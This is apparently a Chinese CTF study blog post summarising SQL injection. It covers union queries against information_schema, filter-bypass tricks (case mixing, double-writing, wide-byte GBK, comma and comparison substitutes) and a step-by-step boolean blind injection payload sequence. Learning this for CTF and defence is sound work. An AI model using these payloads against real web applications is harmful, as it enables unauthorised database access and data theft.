---
title: "SQL注入 总结"
date: 2022-02-20T19:22:37+08:00
draft: true
url: "articles/sqlinject"
categories: ["CTF","SQL"]
---

### Union联合查询

**一些SQL特性：**

```sql
information_schema --+SQL自带的数据库，用于存放元数据
```

这个数据库中的一些常用字段：

* SCHEMATA：提供了当前mysql数据库中所有数据库的信息，其中SCHEMA_NAME字段保存了所有的数据库名。show databases的结果取自此表。

* TABLES：提供了关于数据库中的表的信息，详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息，其中table_name字段保存了所有列名信息，show tables from schemaname的结果取自此表。

* COLUMNS：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息，其中column_name保存了所有的字段信息。show columns from schemaname.tablename的结果取自此表。

例：

```sql
select * from customers where customer_id=1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database() --+查询当前数据库中的所有数据表
select * from customers where customer_id=1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database() --+查询当前数据表的所有字段
```

1. **数字型注入绕过'**

在查询语句中使用16进制代替字符串。

2. **大小写绕过**

SQL本身对大小写不敏感，过滤代码中如未开大小写忽略可进行大小写绕过，如UniOn。

3. **双写绕过**

如过滤代码使用replace方式，将关键字替换为”“空字符串，则可进行双写绕过，如uniunionon，在被过滤一次之后为union，仍能生效。

4. **宽字节注入绕过**

字符型注入若过滤了'，且数据库为GBK编码则可以使用宽字节绕过。

```sql
SELECT * FROM admin WHERE id='1%df''                                 '
#经过转义之后
SELECT * FROM admin WHERE id='1%df\''
SELECT * FROM admin WHERE id='1%df%5c' 注入语句 ' 
```



### 布尔注入

所谓盲注就是在服务器没有错误回显的时候完成注入攻击。
盲注分为布尔盲注和时间盲注。
**布尔盲注：**boolean 根据注入信息返回true or fales 没有任何报错信息。
**时间盲注：**界面返回值ture 无论输入任何值，返回的情况都是正常的来处。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。

#### 布尔注入基本流程：

```sql
1.首先我们需要判断数据库长度 
' or Length(database()) = 8 #返回true说明数据库长度为8
2.获取数据库名字
' or ord(mid(database(),1,1)) ='ascill值'#
依次获取
3.获取表的总数
' or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#
4.获取表的长度(第一个表)
' or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1 )= (猜测得长度)#
5.获取表的内容
' or  mid((select TABLE_NAME from information_schema.TABLES where 
TABLE_SCHEMA=database() limit 0,1),1,1)   = 'a' #
6.获取表的字段的总数
' or  (select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=表名 ) = 8#8返回true说明有8个表
依次类推,最后推出内容。因为是盲猜所以只能这样一个一个去推手工比较麻烦 通常使用sqlmap进行注入
```

一道例题：

[sql注入 - Bugku CTF](https://ctf.bugku.com/challenges/detail/id/112.html)

[WP](https://blog.csdn.net/m0_57954651/article/details/121305540)

#### 绕过技巧：

1. **逗号绕过**

```sql
mid(username,1,1) == mid(username from 1 for 1)
substr(username,1,1) == substr(username from 1 for 1)

select * from admin limit 1,1 == select * from admin limit 1 offset 1
```

2. **比较运算符绕过**

```sql
greatest(n1,n2,n3...) #返回n中的最大值
greatest(ascii(substr(username,1,1)),1)=97
least(n1,n2,n3..) #返回n中的最小值

substr(username,1,1) in ('t');

between a and b; #范围在a与b之间

&lt;#代表小于号(<)
&gt;#代表大于符号(>)
&le;#表示小于或等于符号(<=)
&ge;#表示大于或等于符号(>=)

#注意使用&时要使用%26这一url编码，不然会被当作参数连接的符号
```



### 报错注入

利用MySQL数据库的报错信息，输出查询内容。

[SQL注入-报错注入 | qwzf](https://qwzf.github.io/2019/09/25/SQL注入-报错注入/)

